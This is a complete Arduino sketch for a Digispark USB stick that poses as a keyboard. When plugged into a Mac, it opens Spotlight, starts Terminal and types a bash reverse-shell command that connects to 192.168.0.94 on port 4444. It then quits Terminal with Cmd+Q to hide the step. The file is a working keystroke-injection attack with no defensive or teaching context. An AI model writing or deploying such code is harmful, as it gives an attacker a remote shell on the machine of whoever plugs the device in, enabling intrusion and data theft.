#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.print("Terminal");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("bash &> /dev/tcp/192.168.0.94/4444 0>&1");
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
